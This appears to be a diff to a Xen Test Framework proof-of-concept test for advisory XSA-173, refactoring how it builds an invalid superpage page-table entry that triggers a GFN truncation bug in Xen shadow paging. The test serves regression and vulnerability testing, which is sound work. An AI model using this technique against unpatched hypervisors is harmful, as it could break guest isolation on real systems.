@@ -22,7 +22,9 @@
  */
 #include <xtf.h>
 
+#include <arch/x86/pagetable.h>
 #include <arch/x86/processor.h>
+#include <arch/x86/symbolic-const.h>
 
 /* New L2 pagetable for the test to manipulate. */
 uint64_t nl2[PAE_L2_PT_ENTRIES] __aligned(PAGE_SIZE);
@@ -51,16 +53,14 @@ void test_main(void)
     printk("XSA-173 PoC\n");
 
     /* Hook nl2 into the existing l3, just above the 4GB boundary. */
-    pae_l3_identmap[4] =
-        ((unsigned long)nl2) + _PAGE_USER + _PAGE_RW + _PAGE_PRESENT;
+    pae_l3_identmap[4] = pte_from_virt(nl2, PF_SYM(U, RW, P));
 
     /*
      * Create an invalid super-l2e.  Needs to map a GFN large than 2^44 to
      * trigger the trunction in Xen, and have reserved bits set to help
      * distinguish buggy shadow from non-buggy shadow or hap.
      */
-    nl2[0] = (((1ULL << 34) - 1) << PAGE_SHIFT) +
-        _PAGE_PSE + _PAGE_USER + _PAGE_RW + _PAGE_PRESENT;
+    nl2[0] = pte_from_gfn(((1ULL << 34) - 1), PF_SYM(PSE, U, RW, P));
 
     /* Create a pointer which uses the bad l2e. */
     ptr = _p((4ULL << PAE_L3_PT_SHIFT) + MB(1));
